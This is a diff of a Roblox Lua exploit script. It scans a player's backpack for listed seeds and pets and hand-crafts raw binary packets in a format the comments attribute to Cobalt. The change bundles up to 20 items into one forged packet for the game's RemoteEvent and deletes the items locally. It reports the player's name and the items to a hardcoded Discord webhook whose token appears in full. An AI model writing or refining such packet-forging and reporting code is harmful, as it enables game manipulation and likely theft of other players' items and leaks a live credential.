@@ -1,6 +1,6 @@
 -- Generated Dual Mass Payload Sender
 local ALLOWED_PETS = {"Robin"}
-local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
+local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
 
 local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
@@ -32,23 +32,21 @@ local backpack = player:WaitForChild("Backpack")
 sendWebhook("🚀 **Dual Mass Script Started** by " .. player.Name)
 
 -- Dynamic Serializer function matching Cobalt's binary specs
-local function packItemPayload(itemKey, count, category)
-    -- Prefix control characters
+local function buildItemBlock(itemKey, count, category)
     local typeStr = "\v"
     
-    -- 1. Format ItemKey with dynamically calculated length byte
+    -- 1. Format ItemKey header + value
     local itemKeyHeader = typeStr .. string.char(#"ItemKey") .. "ItemKey"
     local itemKeyValue = typeStr .. string.char(#itemKey) .. itemKey
     
-    -- 2. Format Count (Integer payload structure)
+    -- 2. Format Count header + integer value
     local countHeader = typeStr .. string.char(#"Count") .. "Count"
     local countValue = "\x05" .. string.char(count)
     
-    -- 3. Format Category with length byte
+    -- 3. Format Category header + value
     local categoryHeader = typeStr .. string.char(#"Category") .. "Category"
     local categoryValue = typeStr .. string.char(#category) .. category
     
-    -- Join layout structure
     return "\x1C" .. itemKeyHeader .. itemKeyValue .. countHeader .. countValue .. categoryHeader .. categoryValue
 end
 
@@ -57,9 +55,9 @@ while true do
     local items = backpack:GetChildren()
     local selectedQueue = {}
 
-    -- Scan for target matching inventory
+    -- Scan backpack for target matching items
     for _, item in ipairs(items) do
-        if #selectedQueue >= 20 then break end -- Batch limit
+        if #selectedQueue >= 20 then break end -- Batch limit (max 20)
         
         local isSeed = item:GetAttribute("MainCategory") == "Seed"
         if isSeed then
@@ -77,9 +75,10 @@ while true do
             local petName = item:GetAttribute("Pet")
             local petId = item:GetAttribute("PetId")
             if petName and petId and petLookup[string.lower(petName)] then
+                -- Pets do not stack, count is always 1
                 table.insert(selectedQueue, {
                     ItemInstance = item,
-                    Key = petId, -- Uses direct pet ID layout block
+                    Key = "$" .. petId,
                     Count = 1,
                     Category = "Pets"
                 })
@@ -92,35 +91,44 @@ while true do
         break
     end
 
-    -- Process queue items using correct dynamic byte alignment
-    for _, itemData in ipairs(selectedQueue) do
-        -- Generate strict structure
-        local dataZone = packItemPayload(itemData.Key, itemData.Count, itemData.Category) .. "\x00\x00\x00"
+    -- Construct the complete bundled Cobalt payload
+    local dynamicPayload = ""
+    for idx, itemData in ipairs(selectedQueue) do
+        local itemBlock = buildItemBlock(itemData.Key, itemData.Count, itemData.Category)
         
-        -- Header Assembly with relative sizing
-        local rawSize = #dataZone + 12
-        local sizeByte = string.char(rawSize)
-        
-        -- Assemble full Cobalt binary signature packet
-        local headerZone = "!\x01" .. sizeByte .. "\x00\x00\xC0\x04\xD6&\xF0A\x1C\x05\x01"
-        local finalPayload = headerZone .. dataZone
-        
-        if Event then
-            Event:FireServer(buffer.fromstring(finalPayload))
+        -- Multi-item structural divider formatting
+        if idx == 1 then
+            dynamicPayload = itemBlock
+        else
+            -- \x00\x05 followed by item index index byte separates subsequent items
+            dynamicPayload = dynamicPayload .. "\x00\x05" .. string.char(idx) .. itemBlock
         end
-        
-        task.wait(0.15) -- Small safety yield between individual fires
+    end
+    -- Append trailing structure alignment tail
+    dynamicPayload = dynamicPayload .. "\x00\x00\x00"
+
+    -- Calculate total dynamic packet size for correct header declaration
+    local rawSize = #dynamicPayload + 12
+    local sizeByte = string.char(rawSize)
+    
+    -- Core payload signature structure matching Cobalt packets
+    local headerZone = "!\x01" .. sizeByte .. "\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
+    local finalPayload = headerZone .. dynamicPayload
+
+    -- Fire transaction all in one single packed frame
+    if Event then
+        Event:FireServer(buffer.fromstring(finalPayload))
     end
 
     -- Construct logs & cleanup
     local logLines = {}
     for _, itemData in ipairs(selectedQueue) do
-        table.insert(logLines, string.format("• %s (x%d) processed via packet.", itemData.ItemInstance.Name, itemData.Count))
-        itemData.ItemInstance:Destroy() -- Client cosmetic update only
+        table.insert(logLines, string.format("• %s (x%d) bundled.", itemData.ItemInstance.Name, itemData.Count))
+        itemData.ItemInstance:Destroy() -- Client cosmetic update
     end
     
-    sendWebhook("⚡ **Batch Processed (" .. #selectedQueue .. " items)**:\n" .. table.concat(logLines, "\n"))
+    sendWebhook("⚡ **Batch Fired (" .. #selectedQueue .. " items in 1 packet)**:\n" .. table.concat(logLines, "\n"))
 
-    -- Wait 10 seconds before next scan iteration
+    -- Wait 10 seconds before sweeping the next batch of 20
     task.wait(10)
 end
